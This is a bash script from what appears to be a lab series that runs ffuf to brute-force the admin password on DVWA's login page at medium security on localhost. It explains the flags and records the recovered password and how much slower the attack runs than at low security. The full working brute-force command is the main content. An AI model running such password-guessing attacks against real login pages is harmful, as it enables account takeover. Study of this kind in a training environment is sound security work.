#!/bin/bash
# ============================================================
# Script 02 — ffuf Brute Force (Medium Security)
# Target: http://localhost/vulnerabilities/brute/
# Tool: ffuf v2.1.0-dev
# Security Level: Medium
# ============================================================

# Medium security adds sleep(2) server-side after each failed attempt
# This slows the attack from 1666 req/sec down to ~1 req/sec
# -t 1 reduces threads to 1 to match the server delay and avoid timeouts

ffuf -u "http://localhost/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -b "PHPSESSID=9hk57p2b4a5st7cmpgnem7g1e5; security=medium" \
  -w ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -fr "Username and/or password incorrect" \
  -t 1

# ------------------------------------------------------------
# Flag reference:
# -u     Target URL — FUZZ replaced per attempt
# -b     Cookie — security=medium tells DVWA which level to use
# -w     Wordlist
# -fr    Filter regexp — hide failed responses
# -t 1   Single thread — matches server's enforced 2s delay
# ------------------------------------------------------------

# ------------------------------------------------------------
# Result:
# password  [Status: 200, Size: 4413, Words: 179, Lines: 109]
# Speed: ~1 req/sec | Estimated duration: ~3-4 hours
# ✅ Password still found: "password" — attack works, just slower
#
# Comparison:
# Low:    1666 req/sec → 6 seconds for 10k passwords
# Medium: ~1 req/sec   → ~3-4 hours for 10k passwords
# ------------------------------------------------------------
